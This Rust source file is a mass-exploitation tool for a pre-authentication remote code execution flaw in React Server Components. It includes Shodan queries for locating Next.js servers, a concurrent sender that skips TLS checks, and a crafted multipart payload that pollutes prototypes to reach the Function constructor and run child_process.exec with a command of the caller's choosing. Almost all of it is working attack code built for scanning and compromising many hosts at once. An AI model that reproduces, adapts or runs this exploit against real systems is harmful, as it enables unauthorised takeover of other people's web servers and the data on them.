use futures::stream::{FuturesUnordered, StreamExt};
use reqwest::Client;
/** CVE-2025-55182 Detail React2Shell
A pre-authentication remote code execution vulnerability exists in React Server
Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following
packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack.
The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.
*/
use reqwest::multipart::{Form, Part};
use serde_json::json;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;

#[derive(Debug, Clone)]
pub struct ReactUnsafelyDeserializeRce {
    pub prefix_value: String,
    pub hosts: Vec<String>,
    pub thrs: usize,
}

impl ReactUnsafelyDeserializeRce {
    pub fn new(prefix_value: String, hosts: Vec<String>, thrs: usize) -> Self {
        Self {
            prefix_value,
            hosts,
            thrs,
        }
    }

    pub fn shodan_basic_filter() -> Vec<String> {
        vec![
            r#"http.component:"Next.js""#.to_string(),
            r#"product:"Next.js""#.to_string(),
            r#"title:"Next.js""#.to_string(),
            r#"http.component:"_next""#.to_string(),
            r#"http.html:"/_next""#.to_string(),
            r#"http.html:"/_next/static""#.to_string(),
            r#"http.html:"/_next/data""#.to_string(),
            r#"http.html:"/_next/image""#.to_string(),
            r#"http.html:"__NEXT_DATA__""#.to_string(),
            r#"http.html:"window.__NEXT_DATA__""#.to_string(),
            r#"http.headers.x-powered-by:"Next.js""#.to_string(),
            r#"http.headers.server:"Next.js""#.to_string(),
            r#"http.title:"This page could not be found""#.to_string(),
            r#"http.html:"This page could not be found""#.to_string(),
            r#"http.favicon.hash:-1424036600"#.to_string(),
            r#"http.html:"next/font""#.to_string(),
            r#"http.html:"next/script""#.to_string(),
            r#"http.html:"/_next/static/media""#.to_string(),
            r#"http.html:"/_next/static/runtime""#.to_string(),
        ]
    }

    pub async fn start(&self) -> Result<(), Box<dyn std::error::Error>> {
        let thrs = self.thrs.max(1);
        let hosts = self.hosts.clone();
        let prefix_value = self.prefix_value.clone();

        let semaphore = Arc::new(Semaphore::new(thrs));
        let mut tasks = FuturesUnordered::new();

        for host in hosts {
            let prefix = prefix_value.clone();
            let semaphore = semaphore.clone();

            tasks.push(tokio::spawn(async move {
                let permit = semaphore
                    .acquire_owned()
                    .await
                    .expect("semaphore closed unexpectedly");
                let _permit = permit;

                if let Err(err) = send(&prefix, &host).await {
                    eprintln!("error sending to {host}: {err}");
                }
            }));
        }

        while let Some(join_result) = tasks.next().await {
            if let Err(err) = join_result {
                eprintln!("task join error: {err}");
            }
        }

        Ok(())
    }
}

pub async fn send(prefix_value: &str, host: &str) -> Result<(), Box<dyn std::error::Error>> {
    let payload = build_payload(prefix_value);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    let res = client
        .post(host)
        .header("Next-Action", "x")
        .multipart(payload)
        .send()
        .await;

    let resp = match res {
        Ok(r) => r, // <-- r é Response, aqui o tipo fecha
        Err(e) => {
            match classify(&e) {
                HttpErr::Timeout => println!("{host} got a timeout"),
                HttpErr::Connect => println!("{host} connection failed"),
                HttpErr::Status(code) => println!("{host} returned http {code}"),
                HttpErr::Other(msg) => println!("error sending to {host}: {msg}"),
            }
            return Ok(());
        }
    };

    println!("fetched: {:?}", host);

    Ok(())
}

// Função interna que monta o payload fixo com _prefix substituível
fn build_payload(prefix_value: &str) -> Form {
    let crafted_chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\": \"$B0\"}",
        "_response": {
            "_prefix": format!(
                "process.mainModule.require(\"child_process\").exec(\"{}\")//",
                prefix_value
            ),
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    });

    let form = Form::new()
        .part(
            "0",
            Part::text(serde_json::to_string(&crafted_chunk).expect("ERR")),
        )
        .part("1", Part::text("\"$@0\"".to_string()));

    form
}

#[derive(Debug)]
pub enum HttpErr {
    Timeout,
    Connect,
    Status(u16),
    Other(String),
}

fn classify(e: &reqwest::Error) -> HttpErr {
    if e.is_timeout() {
        return HttpErr::Timeout;
    }
    if e.is_connect() {
        return HttpErr::Connect;
    }
    if let Some(status) = e.status() {
        return HttpErr::Status(status.as_u16());
    }
    HttpErr::Other(e.to_string())
}
